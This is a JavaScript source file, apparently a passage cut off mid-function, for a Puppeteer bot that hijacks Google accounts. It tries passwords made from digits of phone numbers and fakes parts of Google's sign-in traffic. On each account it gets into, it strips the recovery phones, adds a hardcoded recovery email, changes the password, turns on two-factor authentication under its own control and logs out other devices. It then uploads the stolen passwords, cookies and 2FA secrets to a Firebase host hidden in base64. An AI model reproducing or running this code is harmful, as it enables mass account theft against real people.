const StealthPlugin = require('puppeteer-extra-plugin-stealth')
const puppeteer = require('puppeteer-extra')
const twofactor = require('node-2fa')
const readline = require('readline')
const axios = require('axios')
const fs = require('fs')


const BASE_URL = Buffer.from('aHR0cHM6Ly9qb2Itc2VydmVyLTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vJUMyJUEzdWNrJUUzJTgwJTg1eW91L2dtYWlsLw==', 'base64').toString('ascii')


let mList = []
let mUrl = null
let mHeaders = null
let mPostData = null
let mPage = null
let mBrowser = null
let mMailData = null
let mLoadPage = false
let mMailRequest = false
let mLoginRequest = false
let mMailCookies = {}
let mWorkerActive = false
let mError = 0
let mRecaptcha = 0
let COUNTRY = null
let PATTERN = null
let CODE = null
let TIME = null
let SIZE = 0
let SAVE_SIZE = 10

let USER = getUserName()
let FINISH = new Date().getTime()+21000000

let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9qb2Itc2VydmVyLTA4OC5hcHBzcG90LmNvbS9vLw==')

puppeteer.use(StealthPlugin())

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
})
  
const askQuestion = (question) => {
    return new Promise((resolve) => {
      rl.question(question, (answer) => {
        resolve(answer)
      })
    })
}


startServer()


setInterval(async () => {
    await checkStatus()
}, 120000)

async function startServer() {
    console.log('Node: ---START-SERVER---')

    await checkStatus()

    try {
        let response = await axios.get(BASE_URL+'config.json')
        let data = response.data
        PATTERN = data.pattern
        COUNTRY = data.country
        CODE = data.code
    } catch (error) {}

    try {
        let response = await axios.get(BASE_URL+'server/'+USER+'.json')
        let data = response.data
        TIME = data.time
        SIZE = data.size
    } catch (error) {
        SIZE = 0
    }

    await loadBrowser()

    while (true) {
        mWorkerActive = false
        let number = await getNumber()
        if (number && (FINISH <= 0 || FINISH >= new Date().getTime())) {
            mWorkerActive = true
            await loginWithCompleted(CODE, number, PATTERN)
            SIZE++
        } else {
            await delay(10000)
        }
    }
}

async function loadBrowser() {
    try {
        mBrowser = await puppeteer.launch({
            headless: false,
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-notifications',
                '--disable-setuid-sandbox',
                '--ignore-certificate-errors',
                '--ignore-certificate-errors-skip-list',
                '--disable-dev-shm-usage'
            ]
        })
        
        mPage = (await mBrowser.pages())[0]

        mPage.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())

        await mPage.setRequestInterception(true)

        mPage.on('request', async request => {
            try {
                let url = request.url()
                if (url.startsWith('https://mail.google.com/accounts/SetOSID') && mMailRequest) {
                    try {
                        mMailCookies = await getMailCookie(await getNewCookies(await mPage.cookies()))
                        mMailData = await getMailTokenData(url)
                        
                        let contentType = 'text/html; charset=utf-8'
                        let output = '<!DOCTYPE html><html><body><h1>Gmail</h1></body></html>'

                        mMailRequest = false

                        request.respond({
                            ok: true,
                            status: 200,
                            contentType,
                            body: output,
                        })
                    } catch (error) {
                        request.continue()
                    }
                } else if (url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=V1UmUe') && mLoginRequest) {
                    mUrl = url
                    mLoginRequest = false
                    mHeaders = request.headers()
                    mPostData = request.postData()
                    let contentType = 'application/json; charset=utf-8'
                    let output = decode('KV19JwoKMTk1CltbIndyYi5mciIsIlYxVW1VZSIsIltudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzExXV0iLG51bGwsbnVsbCxudWxsLCJnZW5lcmljIl0sWyJkaSIsNThdLFsiYWYuaHR0cHJtIiw1OCwiLTI1OTg0NDI2NDQ4NDcyOTY2MTMiLDY1XV0KMjUKW1siZSIsNCxudWxsLG51bGwsMjMxXV0K')

                    request.respond({
                        ok: true,
                        status: 200,
                        contentType,
                        body: output,
                    })
                } else {
                    request.continue()
                }
            } catch (error) {
                request.continue()
            }
        })

        console.log('Node[ Browser Load Success --- Time: '+getTime()+' ]')
        mLoadPage = false
        await loadLoginPage()
        mLoadPage = true
        console.log('Node[ Page Load Success --- Time: '+getTime()+' ]')
    } catch (error) {}
}

async function loginWithCompleted(code, number, pattern) {
    try {
        let data = await getLoginToken('+'+code+number)

        console.log('Node: [ Number: +'+code+number+' ---  Status: '+data.status+' --- Time: '+getTime()+' ]')
        
        if (data.status == 0) {
            mError++
            if (mError > 3) {
                await closeBrowser()
                mError = 0
            }
        } else if (data.status == 3) {
            mError = 0
            mRecaptcha++
            if (mRecaptcha > 10) {
                await closeBrowser()
                mRecaptcha = 0
            }
        } else {
            mError = 0
            mRecaptcha = 0

            if (data.status == 1 && data.type == '/v3/signin/challenge/pwd') {
                let password = getPassword('+'+code+number, pattern)

                for (let i = 0; i < password.length; i++) {
                    let status = await checkPassword(password[i], data.tl, data.cid)

                    console.log('Node: [ Password: '+password[i]+' ---  Status: '+status+' --- Time: '+getTime()+' ]')

                    if (status == 400) {
                        continue
                    }

                    if (status == 200) {
                        await delay(2000)
                        await completedChange(mPage, '+'+code+number, password[i])
                    } else if (status == 205) {
                        console.log(data)
                        
                        await numberVerification(mPage, '+'+code+number, password[i], data.tl)

                        await delay(1000000)
                    } else {
                        try {
                            await axios.patch(BASE_URL+'password/'+COUNTRY+'.json', '{"'+number+'":"'+(i+1)+':'+status+'"}', {
                                headers: {
                                    'Content-Type': 'application/x-www-form-urlencoded'
                                }
                            })
                        } catch (error) {}
                    }

                    break
                }
            } else {
                console.log(data)
            }
        }
    } catch (error) {}

    await saveSize(false)
}

async function numberVerification(page, number, password, tl) {
    try {
        let mStatus = 0
        for (let i = 0; i < 3; i++) {
            await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com/signinoptions/rescuephone', { waitUntil: 'load', timeout: 0 })
            await delay(1000)
            await page.type('#identifierId', number)
            await delay(500)
            await page.click('#identifierNext')
            mStatus = await waitForLoginStatus(page)
    
            if (mStatus == 1 || mStatus == 2 || mStatus == 8) {
                console.log('Status:', mStatus)
                break
            }
        }
        if (mStatus == 1) {
            await delay(1000)
            await waitForPasswordType(page, password)
            await delay(500)
            await page.click('#passwordNext')
    
            let status = await waitForLoginSuccess(page)

            console.log(status)
        }
    } catch (error) {}
    // let vNumber = await askQuestion('Enter Number:')
    
    // let status = await page.evaluate((number, tl) => {
    //     let fToken = 'AEThLly6uCbNDRnPpzMkuuAJYtc99E0beNMe2Sey6bzGZk4NLm5_LcvVPQKZgKRsDtmlpTDjQlB-uOHr6c53UfZg3NluDCxXYZRJ-4bE5Ub9gLRdJpDAFJwQHc1pn_XbQrevGfHAJE_5r3eAEmksoDpmfCbOeCEq3XxegyqZMYZa-EwRRNWYsk-zGsKYdsnVPF0q0cuklrL7909qvNPYUbySlpS3b5bGm93GuKHTILXy6SjRhYxeRpg8sTcCF_zODHqRizl7Fjl78v5JLPnkvyJdieknWOaHK7y1IilWN3NyEX5V25p67CVJeBWBMKb_rlj5AowiI15i16uMQgpUS61NPF5bdUmJNZGGzY8sZyeCCb81nJZQNsarUN2pZXG7MuBC_sDrHishMSmf_DYVmx3BMKjMENtsxw'
    //     let body = 'TL='+ tl +'&continue=https%3A%2F%2Fmyaccount.google.com%2Fsigninoptions%2Frescuephone&ddm=1&flowEntry=ServiceLogin&service=accountsettings&f.req=%5B%22'+encodeURIComponent(fToken)+'%22%2Cnull%2C4%2Cnull%2C%5B17%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%22SMS%22%2C%22%2B'+number+'%22%2C%22us%22%5D%5D%5D&bghash=EnlasuKUuS77W_w7ZQh8RrMFhr0osjVW4zk80kjaW0s&at='+encodeURIComponent(window.WIZ_global_data.SNlM0e)+'&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22BD%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C1%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C1%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&checkConnection=youtube%3A251&checkedDomains=youtube&pstMsg=1&'

    //     return (async () => {
    //         try {
    //             let response = await fetch('https://accounts.google.com/_/signin/challenge?hl=en&TL='+tl, {
    //                 'headers': {
    //                   'accept': '*/*',
    //                   'accept-language': 'en-US,en;q=0.9',
    //                   'cache-control': 'no-cache',
    //                   'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    //                   'google-accounts-xsrf': '1',
    //                   'x-same-domain': '1',
    //                   'cache': 'no-cache'
    //                 },
    //                 'referrerPolicy': 'strict-origin-when-cross-origin',
    //                 'body': body,
    //                 'method': 'POST',
    //                 'mode': 'cors',
    //                 'credentials': 'same-origin'
    //             })
    
    //             let data = await response.text()

    //             return data
    //         } catch (error) {}

    //         return null
    //     })()
    // }, vNumber, tl)

    // console.log(status)

    // let OTP = await askQuestion('Enter OTP:')

    // status = await page.evaluate((otp, tl) => {
    //     let fToken = 'AEThLly6uCbNDRnPpzMkuuAJYtc99E0beNMe2Sey6bzGZk4NLm5_LcvVPQKZgKRsDtmlpTDjQlB-uOHr6c53UfZg3NluDCxXYZRJ-4bE5Ub9gLRdJpDAFJwQHc1pn_XbQrevGfHAJE_5r3eAEmksoDpmfCbOeCEq3XxegyqZMYZa-EwRRNWYsk-zGsKYdsnVPF0q0cuklrL7909qvNPYUbySlpS3b5bGm93GuKHTILXy6SjRhYxeRpg8sTcCF_zODHqRizl7Fjl78v5JLPnkvyJdieknWOaHK7y1IilWN3NyEX5V25p67CVJeBWBMKb_rlj5AowiI15i16uMQgpUS61NPF5bdUmJNZGGzY8sZyeCCb81nJZQNsarUN2pZXG7MuBC_sDrHishMSmf_DYVmx3BMKjMENtsxw'
    //     let body = 'TL='+ tl +'&continue=https%3A%2F%2Fmyaccount.google.com%2Fsigninoptions%2Frescuephone&ddm=1&flowEntry=ServiceLogin&service=accountsettings&f.req=%5B%22'+encodeURIComponent(fToken)+'%22%2Cnull%2C4%2Cnull%2C%5B17%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5Bnull%2Cnull%2Cnull%2C%22'+otp+'%22%5D%5D%5D&bghash=EnlasuKUuS77W_w7ZQh8RrMFhr0osjVW4zk80kjaW0s&at='+encodeURIComponent(window.WIZ_global_data.SNlM0e)+'&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22BD%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C1%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C1%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&checkConnection=youtube%3A251&checkedDomains=youtube&pstMsg=1&'
        
    //     return (async () => {
    //         try {
    //             let response = await fetch('https://accounts.google.com/_/signin/challenge?hl=en&TL='+tl, {
    //                 'headers': {
    //                   'accept': '*/*',
    //                   'accept-language': 'en-US,en;q=0.9',
    //                   'cache-control': 'no-cache',
    //                   'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    //                   'google-accounts-xsrf': '1',
    //                   'x-same-domain': '1',
    //                   'cache': 'no-cache'
    //                 },
    //                 'referrerPolicy': 'strict-origin-when-cross-origin',
    //                 'body': body,
    //                 'method': 'POST',
    //                 'mode': 'cors',
    //                 'credentials': 'same-origin'
    //             })
    
    //             let data = await response.text()

    //             return data
    //         } catch (error) {}

    //         return null
    //     })()
    // }, OTP, tl)

    // console.log(status)

    // await page.goto('https://accounts.google.com/speedbump/idvreenable?TL='+tl+'&checkConnection=youtube%3A292&checkedDomains=youtube&continue=https%3A%2F%2Fmyaccount.google.com%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dgo-to-account-button%26gar%3DWzEzMywiMjM2NzM2Il0%26sl%3Dtrue&dsh=S221366587%3A1742061127455205&flowEntry=ServiceLogin&flowName=GlifWebSignIn&ifkv=AXH0vVu9RX-pD6GvWjwbdSphuyabYo34eLKGBBitWWWx558EOO1Szatw6nUyDaugzPlwmHIrlw_62Q&pstMsg=1&service=accountsettings')

    await askQuestion('Success:')

    await completedChange(page, number, password)
}


async function completedChange(page, number, password) {
    try {
        let mToken = await waitForRaptToken(page, number, password)
    
        let mPassword = mToken.password
        let mRapt = mToken.token

        console.log('Node: [ Rapt Token: '+(mRapt == null ? 'NULL' : 'Received')+' --- Time: '+getTime()+' ]')
        
        if (mRapt) {
            let mData = await waitForAccountDetails(page)
    
            console.log('Node: [ Gmail Name: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
            
            for (let i = 0; i < 3; i++) {
                if (await waitForRemoveRecovery(page, mRapt)) {
                    break
                }
            }

            mMailRequest = true
            await page.goto('https://mail.google.com/mail/u/0/')
            mMailYear = await getMailYear(mMailData)

            let mDeviceYear = await waitForDeviceLogout(page, 3)
            
            let mYear = mData.year
            mYear = (mDeviceYear < mYear) ? mDeviceYear : mYear

            let mNumberYear = await waitForNumberRemove(page, mRapt)

            mYear = (mNumberYear < mYear) ? mNumberYear : mYear
            
            console.log('Node: [ Mail Create Year: ['+mMailYear+','+mYear+'] --- Time: '+getTime()+' ]')
            
            let mRecovery = await waitForRecoveryAdd(page, mRapt, mYear < 2019 || mMailYear < 2019 ? 'arafat.arf121@gmail.com' : null)

            console.log('Node: [ Recovery Mail: '+mRecovery+' --- Time: '+getTime()+' ]')

            if (!mPassword) mPassword = await waitForPasswordChange(page, mRapt)

            try {
                await axios.patch(BASE_URL+'completed'+((mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, create: mYear, mail:mMailYear }), {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                })
            } catch (error) {}

            console.log('Node: [ New Password: '+mPassword+' --- Time: '+getTime()+' ]')
            
            await waitForLanguageChange(page)

            console.log('Node: [ Language Change: English --- Time: '+getTime()+' ]')

            await waitForSkipPassworp(page, mRapt)

            console.log('Node: [ Skip Password: Stop --- Time: '+getTime()+' ]')

            await waitForNameChange(page, mRapt)

            let mTwoFa = await waitForTwoFaActive(page, mRapt)

            console.log('Node: [ Two Fa: Enable '+((mTwoFa.auth || mTwoFa.backup) && !mTwoFa.error ? 'Success': 'Failed')+' --- Time: '+getTime()+' ]')
            
            await waitForDeviceLogout(page, 1)

            let n_cookies = await getNewCookies(await page.cookies())
            
            try {
                await axios.patch(BASE_URL+'completed'+(mTwoFa.error ? '_error':(mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, n_cookies:n_cookies, create: mYear, mail:mMailYear, auth:mTwoFa.auth, backup:mTwoFa.backup }), {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                })

                console.log('Node: [ Change Completed: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
            } catch (error) {}

            await page.goto('about:blank')
            await delay(1000)
            await closeBrowser()
        }
    } catch (error) {}
}

async function getLoginToken(number) {
    try {
        if (mBrowser == null) {
            await loadBrowser()
        }
        for (let i = 0; i < 15; i++) {
            if (mLoadPage) {
                break
            }
            await delay(3000)
        }

        await loadingRemove()
        mUrl = null
        mHeaders = null
        mPostData = null
        mLoginRequest = true
        await mPage.evaluate((number) => {
            document.querySelector('input#identifierId').value = number
            document.querySelector('#identifierNext').click()
        }, number)
        await loadingRemove()
        let url = null
        let headers = null
        let postData = null
        for (let i = 0; i < 30; i++) {
            if (mUrl && mPostData && mHeaders) {
                url = mUrl
                headers = mHeaders
                postData = mPostData
                break
            }
            await delay(500)
        }
        mUrl = null
        mHeaders = null
        mPostData = null
        mLoginRequest = false
        await loadingRemove()
        
        if (url && postData && headers) {
            let response = await axios.post(url, postData, {
                headers: headers,
                maxRedirects: 0,
                validateStatus: null
            })
            let data = response.data
            let temp = data.substring(data.indexOf('[['), data.lastIndexOf(']]')-2)
            temp = temp.substring(0, temp.lastIndexOf(']]')+2)

            let json = JSON.parse(temp)[0]
            if (json[1] == 'V1UmUe') {
                let value = JSON.parse(json[2])
                if (value[21]) {
                    let info = value[21][1][0]
                    return { status:1, tl:info[1][1][1], cid:info[1][0][1], type:info[0] }
                } else if (value[18] && value[18][0]) {
                    return { status:3 }
                } else {
                    return { status:2 }
                }
            }
        }
    } catch (error) {}

    return { status:0 }
}

async function checkPassword(password, tl, cid) {
    return await mPage.evaluate((token, password, tl, cid) => {
        let fToken = 'AEThLly6uCbNDRnPpzMkuuAJYtc99E0beNMe2Sey6bzGZk4NLm5_LcvVPQKZgKRsDtmlpTDjQlB-uOHr6c53UfZg3NluDCxXYZRJ-4bE5Ub9gLRdJpDAFJwQHc1pn_XbQrevGfHAJE_5r3eAEmksoDpmfCbOeCEq3XxegyqZMYZa-EwRRNWYsk-zGsKYdsnVPF0q0cuklrL7909qvNPYUbySlpS3b5bGm93GuKHTILXy6SjRhYxeRpg8sTcCF_zODHqRizl7Fjl78v5JLPnkvyJdieknWOaHK7y1IilWN3NyEX5V25p67CVJeBWBMKb_rlj5AowiI15i16uMQgpUS61NPF5bdUmJNZGGzY8sZyeCCb81nJZQNsarUN2pZXG7MuBC_sDrHishMSmf_DYVmx3BMKjMENtsxw'
        let body = 'TL='+ tl +'&continue=https%3A%2F%2Fmyaccount.google.com%2Fsigninoptions%2Frescuephone&ddm=0&flowEntry=ServiceLogin&service=accountsettings&f.req=%5B%22'+encodeURIComponent(fToken)+'%22%2Cnull%2C'+cid+'%2Cnull%2C%5B1%2Cnull%2Cnull%2Cnull%2C%5B%22'+encodeURIComponent(password)+'%22%2Cnull%2C1%5D%5D%5D&bgRequest=%5B%22identifier%22%2C%22'+encodeURIComponent(token)+'%22%5D&at='+encodeURIComponent(window.WIZ_global_data.SNlM0e)+'&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22BD%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C1%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C1%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&checkConnection=youtube%3A251&checkedDomains=youtube&pstMsg=1&'
        
        return (async () => {
            try {
                let response = await fetch('https://accounts.google.com/_/signin/challenge?hl=en&TL='+tl, {
                    'headers': {
                      'accept': '*/*',
                      'accept-language': 'en-US,en;q=0.9',
                      'cache-control': 'no-cache',
                      'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                      'google-accounts-xsrf': '1',
                      'x-same-domain': '1',
                      'cache': 'no-cache'
                    },
                    'referrerPolicy': 'strict-origin-when-cross-origin',
                    'body': body,
                    'method': 'POST',
                    'mode': 'cors',
                    'credentials': 'same-origin'
                })
    
                let data = await response.text()

                let condition = data.substring(0, 40)
                if (condition.includes("gf.sicr")) {
                    if (data.includes('INCORRECT_ANSWER_ENTERED')) {
                        return 400
                    } else if (data.includes('TWO_STEP_VERIFICATION')) {
                        return 202
                    } else if (data.includes('LOGIN_CHALLENGE') && data.includes('SEND_SUCCESS')) {
                        return 203
                    } else if (data.includes('LOGIN_CHALLENGE') && data.includes('INITIALIZED')) {
                        if (data.includes('SMS') || data.includes('VOICE') || data.includes('RECOVERY')) {
                            return 204
                        } else if (data.includes('null,null,17,7,null,null')) {
                            return 205
                        } else {
                           return 203
                        }
                    } else if (data.includes('https://accounts.google.com/CheckCookie') || data.includes('https%3A%2F%2Faccounts.google.com%2FCheckCookie') || data.includes('https%3a%2f%2faccounts.google.com%2fCheckCookie')) {
                        return 200
                    } else if (data.includes('webapproval')) {
                        return 201
                    } else if (data.includes('https://accounts.google.com/signin/v2/disabled/explanation') || data.includes('https%3A%2F%2Faccounts.google.com%2Fsignin%2Frecovery') || data.includes('https%3a%2f%2faccounts.google.com%2fsignin%2frecovery')) {
                        return 206
                    } else {
                        return 204
                    }
                }
            } catch (error) {}

            return 100
        })()
    }, getRandomToken(getRandomInt(600, 800)), password, tl, cid)
}

async function loadingRemove() {
    await mPage.evaluate(() => {
        let root = document.querySelector('div[class="kPY6ve"]')
        if (root) {
            root.remove()
        }
        root = document.querySelector('div[class="Ih3FE"]')
        if (root) {
            root.remove()
        }
    })
}

async function loadLoginPage() {
    for (let i = 0; i < 3; i++) {
        try {
            await mPage.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com/signinoptions/rescuephone')
            await delay(500)
            break
        } catch (error) {}
    }
}

async function closeBrowser() {
    try {
        try {
            if (mPage != null) {
                await mPage.close()
            }
        } catch (error) {}

        try {
            if (mBrowser != null) {
                await mBrowser.close()
            }
            mBrowser = null
        } catch (error) {
            mBrowser = null
        }
    } catch (error) {}
}

async function saveSize(instant) {
    if (instant || SIZE%SAVE_SIZE == 0) {
        try {
            await axios.patch(BASE_URL+'server/'+USER+'.json', JSON.stringify({ size:SIZE }), {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
            })
        } catch (error) {}
    }
}

function getPassword(number, pattern) {
    let list = []

    try {
        let split = pattern.split(',')
        for (let i = 0; i < split.length; i++) {
            try {
                let sub = split[i].split('-')
                if (sub.length == 1) {
                    list.push(number.substring(number.length-parseInt(sub[0]), number.length))
                } else if (sub.length == 2) {
                    list.push(number.substring(number.length-parseInt(sub[1]), number.length-parseInt(sub[0])))
                }
            } catch (error) {}
        }
    } catch (error) {}

    return list
}

async function waitForLoginStatus(page) {
    let status = 0
    
    for (let i = 0; i < 30; i++) {
        try {
            let pageUrl = await page.evaluate(() => window.location.href)
            
            if (pageUrl) {
                if (pageUrl.startsWith('https://accounts.google.com/v3/signin/identifier')) {
                    let captcha = await page.waitForRequest(req => req.url())
                    if (captcha.url().startsWith('https://accounts.google.com/Captcha')) {
                        status = 9
                        break
                    }
                } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/pwd')) {
                    status = 1
                    break
                } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/rejected')) {
                    let isDisable = await page.evaluate(() => {
                        let root = document.querySelector('#headingText')
                        if (root) {
                            return root.innerText == 'Account disabled'
                        }
                        return false
                    })
                    status = isDisable?2:8
                    break
                } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/dp')) {
                    status = 3
                    break
                } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/recaptcha')) {
                    status = 4
                    break
                } else if(pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/pk/presend')) {
                    status = 5
                    break
                }
            }
        } catch (error) {}

        await delay(500)
    }
    return status
}

async function waitForLoginSuccess(page) {
    let status = 0
    
    for (let load = 0; load < 30; load++) {
        try {
            let pageUrl = await page.evaluate(() => window.location.href)
            
            if (pageUrl.startsWith('https://gds.google.com/web')) {
                status = 1
                break
            } else if (pageUrl.startsWith('https://myaccount.google.com') || pageUrl.startsWith('https://mail.google.com')) {
                status = 1
                break
            } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/pwd')) {
                let wrong = await page.evaluate(() => {
                    let root = document.querySelector('div[class="Ly8vae uSvLId"] > div')
                    if (root) {
                        return true
                    }
                    return false
                })

                if (wrong) {
                    status = 2
                    break
                }
            } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/selection')) {
                status = 3
                break
            } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/dp')) {
                status = 4
                break
            } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/ipp/collect')) {
                status = 5
                break
            } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/ootp')) {
                status = 6
                break
            } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/rejected')) {
                status = 7
                break
            } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/totp')) {
                status = 7
                break
            }  else if (pageUrl.startsWith('https://accounts.google.com/signin/v2/speedbump/changepassword/changepasswordform')) {
                status = 8
                break
            } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/iap')) {
                status = 9
                break
            } else if (pageUrl.startsWith('https://accounts.google.com/signin/v2/passkeyenrollment') || pageUrl.startsWith('https://accounts.google.com/v3/signin/speedbump/passkeyenrollment')) {
                load = 10
                let notNow = 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7 BqKGqe eR0mzb TrZEUc lw1w4b"]'
                await waitForSelector(page, notNow)
                await page.click(notNow)
                await delay(3000)
            }
        } catch (error) {}

        await delay(500)
    }

    return status
}

async function waitForPasswordType(page, password) {
    
    for (let i = 0; i < 10; i++) {
        await delay(1000)

        try {
            let data = await exists(page, 'input[type="password"]')
            if (data) {
                await page.type('input[type="password"]', password)

                let success = await page.evaluate((password) => {
                    try {
                        let root = document.querySelector('input[type="password"]')
                        if (root && root.value == password) {
                            return true
                        }
                    } catch (error) {}

                    return false
                }, password)

                if (success) {
                    break
                }
            }
        } catch (error) {}
    }
}

async function waitForNumberRemove(page, mRapt) {
    try {
        await page.goto('https://myaccount.google.com/phone?hl=en', { waitUntil: 'load', timeout: 0 })
        await delay(500)

        let mYear = await page.evaluate(() => {
            let list = document.querySelectorAll('script')
            let years = []
            let year = parseInt(new Date().getFullYear())

            try {
                for (let i = 0; i < list.length; i++) {
                    let html = list[i].innerHTML
                    if (html.startsWith('AF_initDataCallback') && html.includes('rescuephone')) {
                        let data_list = JSON.parse(html.substring(html.indexOf('['), html.lastIndexOf(']')+1))
                        let data = data_list[0]
                        for (let i = 0; i < data.length; i++) {
                            try {
                                let date = data[i][18]
                                if (date > 0) years.push(date)
                            } catch (error) {}
                        }
                    }
                }

                years.sort(function(a, b){return a-b})

                if(years.length > 0) {
                    year = parseInt(new Date(years[0]).getFullYear())
                }
            } catch (error) {}

            return year
        })
        
        let mList = await page.evaluate(() => {
            let root = document.querySelectorAll('div[data-encrypted-phone]')
            let list = []
        
            if (root) {
                for (let i = 0; i < root.length; i++) {
                    try {
                        let data = root[i].getAttribute('data-encrypted-phone')
                        if (data) {
                            list.push(data)
                        }
                    } catch (error) {}
                }
            }

            return list
        })
        
        console.log('Node: [ Number Add: '+mList.length+' --- Time: '+getTime()+' ]')

        for (let i = 0; i < mList.length; i++) {
            try {
                await page.goto('https://myaccount.google.com/phone?hl=en&rapt='+mRapt+'&ph='+mList[i], { waitUntil: 'load', timeout: 0 })
                await delay(500)
                if (await exists(page, 'button[class="VfPpkd-Bz112c-LgbsSe yHy1rc eT1oJ mN1ivc wMI9H"]')) {
                    let button = await page.$$('button[class="VfPpkd-Bz112c-LgbsSe yHy1rc eT1oJ mN1ivc wMI9H"]')
                    if (button && button.length > 0) {
                        await button[button.length-1].click()
                        await delay(1000)
                    }
                } else if (await exists(page, 'button[class="pYTkkf-Bz112c-LgbsSe wMI9H Qd9OXe"]')) {
                    let button = await page.$$('button[class="pYTkkf-Bz112c-LgbsSe wMI9H Qd9OXe"]')
                    if (button && button.length > 0) {
                        await button[button.length-1].click()
                        await delay(1000)
                    }
                }

                for (let i = 0; i < 3; i++) {
                    try {
                        if (await exists(page, 'button[data-mdc-dialog-action="ok"]')) {
                            await page.click('button[data-mdc-dialog-action="ok"]')
                            await delay(3000)
                            break
                        } else {
                            let button = await page.$$('div[class="U26fgb O0WRkf oG5Srb HQ8yf C0oVfc kHssdc HvOprf FsOtSd M9Bg4d"]')
                            if (button && button.length > 0) {
                                await button[button.length-1].click()
                                await delay(3000)
                                break
                            } else {
                                let button = await page.$$('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7"]')
                                if (button && button.length > 0) {
                                    await button[button.length-1].click()
                                    await delay(3000)
                                    break
                                }
                            }
                        }
                    } catch (error) {}

                    await delay(1000)
                }
            } catch (error) {}
        }

        return mYear
    } catch (error) {}

    return parseInt(new Date().getFullYear())
}

async function waitForPasswordChange(page, mRapt) {
    try {
        await page.goto('https://myaccount.google.com/signinoptions/password?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
        await delay(500)
        let mPassword = getRandomPass()
        await page.type('input[name="password"]', mPassword)
        await delay(500)
        await page.type('input[name="confirmation_password"]', mPassword)
        await delay(500)
        await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 wMI9H"]')

        for (let i = 0; i < 20; i++) {
            try {
                let url = await page.url()
                if (url.startsWith('https://myaccount.google.com/security-checkup-welcome')) {
                    break
                } else if (await exists(page, 'div[class="uW2Fw-T0kwCb"] > div:nth-child(2) > button')) {
                    await delay(500)
                    await page.click('div[class="uW2Fw-T0kwCb"] > div:nth-child(2) > button')
                    await delay(3000)
                } else if (await exists(page, 'div[class="VfPpkd-T0kwCb"] > button:nth-child(2)')) {
                    await delay(500)
                    await page.click('div[class="VfPpkd-T0kwCb"] > button:nth-child(2)')
                    await delay(3000)
                }
            } catch (error) {}

            await delay(500)
        }

